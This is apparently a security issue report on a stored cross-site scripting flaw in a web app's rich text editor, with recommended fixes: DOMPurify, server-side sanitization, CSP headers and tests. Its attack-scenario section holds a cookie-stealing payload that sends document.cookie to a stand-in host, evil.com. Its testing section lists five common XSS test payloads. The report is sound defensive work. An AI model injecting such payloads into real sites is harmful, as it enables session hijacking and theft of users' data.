# [SECURITY] XSS Vulnerability in Rich Text Editor

## Priority: P1 (High)
## Severity: WARNING
## Category: Cross-Site Scripting (XSS)
## CWE: CWE-79
## OWASP: A03:2021 - Injection

---

## Executive Summary

The rich text editor (`/editor` page) renders user-supplied content using `dangerouslySetInnerHTML` without sanitization. While TipTap provides some XSS protection during editing, the stored content in the database could be manipulated to inject malicious scripts that execute when other users view the content.

---

## Vulnerability Details

### Affected File
- **File:** `apps/web/src/pages/editor.tsx`
- **Line:** 530
- **Code:**
```tsx
<div dangerouslySetInnerHTML={{ __html: richContent }} />
```

### Description
The editor page retrieves `ruleSpec.richText` from the database and renders it directly using `dangerouslySetInnerHTML` without sanitization. This creates a stored XSS vulnerability if an attacker can:
1. Manipulate the database directly
2. Exploit an API vulnerability to inject malicious HTML
3. Bypass TipTap's client-side protections

### Attack Scenario
```javascript
// Malicious content in database:
const payload = '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\' + document.cookie)">';

// When rendered without sanitization:
<div dangerouslySetInnerHTML={{ __html: payload }} />
// Result: Cookie theft, session hijacking
```

### Risk Level
- **Likelihood:** Medium (requires database/API manipulation)
- **Impact:** High (session hijacking, data theft, account takeover)
- **Overall Risk:** HIGH

---

## Recommended Fix

### Solution 1: Add DOMPurify Sanitization (Recommended)

DOMPurify is already installed (`dompurify@3.3.0`) but not imported/used.

```tsx
import DOMPurify from 'dompurify';

// In editor.tsx component
const sanitizedContent = useMemo(() => {
  return DOMPurify.sanitize(richContent, {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'em', 'u', 's', 'h1', 'h2', 'h3',
      'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'a', 'table',
      'thead', 'tbody', 'tr', 'th', 'td'
    ],
    ALLOWED_ATTR: ['href', 'class', 'style'],
    ALLOW_DATA_ATTR: false
  });
}, [richContent]);

// Render:
<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

### Solution 2: Server-Side Sanitization (Defense-in-Depth)

Add sanitization in the backend when saving rich text:

```csharp
// apps/api/src/Api/Services/RuleSpecService.cs
using Ganss.Xss;

private readonly HtmlSanitizer _sanitizer = new HtmlSanitizer();

public async Task<RuleSpec> UpdateRuleSpecAsync(UpdateRuleSpecRequest request)
{
    // Sanitize rich text before saving
    if (!string.IsNullOrEmpty(request.RichText))
    {
        request.RichText = _sanitizer.Sanitize(request.RichText);
    }
    // ... rest of method
}
```

**Package:** `HtmlSanitizer` (install via NuGet)

---

## Implementation Steps

### Phase 1: Frontend Sanitization (4 hours)
1. ✅ DOMPurify is already installed
2. Import DOMPurify in `apps/web/src/pages/editor.tsx`
3. Create `useMemo` hook to sanitize content before rendering
4. Test with XSS payloads (see Testing section)
5. Update tests in `apps/web/src/__tests__/editor.test.tsx`

### Phase 2: Backend Validation (2 hours)
6. Install `HtmlSanitizer` NuGet package
7. Add sanitization to `RuleSpecService.CreateRuleSpecAsync()`
8. Add sanitization to `RuleSpecService.UpdateRuleSpecAsync()`
9. Add unit tests for sanitization

### Phase 3: CSP Headers (Optional, 1 hour)
10. Add Content-Security-Policy headers in `Program.cs`:
```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");
    await next();
});
```

---

## Testing Strategy

### Manual XSS Testing

Test with these payloads to ensure they're neutralized:

```javascript
// Test 1: Basic script injection
<script>alert('XSS')</script>

// Test 2: Event handler
<img src=x onerror=alert('XSS')>

// Test 3: SVG-based XSS
<svg onload=alert('XSS')>

// Test 4: Data URI
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>

// Test 5: JavaScript protocol
<a href="javascript:alert('XSS')">Click</a>
```

**Expected Result:** All payloads should be sanitized (scripts removed, events stripped).

### Automated Testing

Add Jest test in `apps/web/src/__tests__/editor.test.tsx`:

```typescript
import { render } from '@testing-library/react';
import DOMPurify from 'dompurify';

describe('Editor XSS Protection', () => {
  it('should sanitize malicious script tags', () => {
    const malicious = '<script>alert("XSS")</script><p>Safe content</p>';
    const sanitized = DOMPurify.sanitize(malicious);

    expect(sanitized).not.toContain('<script>');
    expect(sanitized).toContain('<p>Safe content</p>');
  });

  it('should sanitize event handlers', () => {
    const malicious = '<img src=x onerror=alert("XSS")>';
    const sanitized = DOMPurify.sanitize(malicious);

    expect(sanitized).not.toContain('onerror');
  });
});
```

---

## Impact Assessment

### Security Impact
- ✅ Prevents stored XSS attacks
- ✅ Protects user sessions from hijacking
- ✅ Prevents data theft via malicious scripts
- ✅ Reduces attack surface for content-based exploits

### Performance Impact
- **DOMPurify sanitization:** ~1-5ms for typical content (negligible)
- **useMemo optimization:** Prevents re-sanitization on re-renders

### User Impact
- ⚠️ Minimal - Legitimate HTML is preserved
- ⚠️ Malicious scripts/handlers are removed (intended behavior)

---

## Related Security Findings

### Other dangerouslySetInnerHTML Usage (Safe)

**File:** `apps/web/src/components/diff/PrismHighlighter.tsx:34`
```tsx
dangerouslySetInnerHTML={{ __html: highlightedHtml }}
```
**Status:** ✅ SAFE - Prism.js escapes user input during syntax highlighting.

---

## Definition of Done

- [x] Security report generated
- [ ] DOMPurify imported and configured in `editor.tsx`
- [ ] Content sanitized before rendering with `dangerouslySetInnerHTML`
- [ ] XSS payloads tested manually (all 5 test cases pass)
- [ ] Automated tests added (`editor.test.tsx`)
- [ ] Backend sanitization added to `RuleSpecService` (optional but recommended)
- [ ] CSP headers configured (optional)
- [ ] Code review approved
- [ ] Deployed to staging and tested
- [ ] Security scan re-run (Semgrep confirms no XSS warnings)

---

## Effort Estimate
- **Phase 1 (Frontend):** 4 hours
- **Phase 2 (Backend):** 2 hours
- **Phase 3 (CSP):** 1 hour (optional)
- **Total:** 6-7 hours

---

## References

- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **DOMPurify Documentation:** https://github.com/cure53/DOMPurify
- **CWE-79:** https://cwe.mitre.org/data/definitions/79.html
- **TipTap Security:** https://tiptap.dev/docs/editor/security

---

## Related Issues
- #264 - SEC-04: Security Audit Implementation
- #307 - SEC-03: Security Scanning Pipeline

---

**Detected by:** Semgrep Security Analysis
**Report Date:** 2025-11-04
**Assignee:** TBD
**Labels:** `security`, `xss`, `p1-high`, `frontend`, `editor`
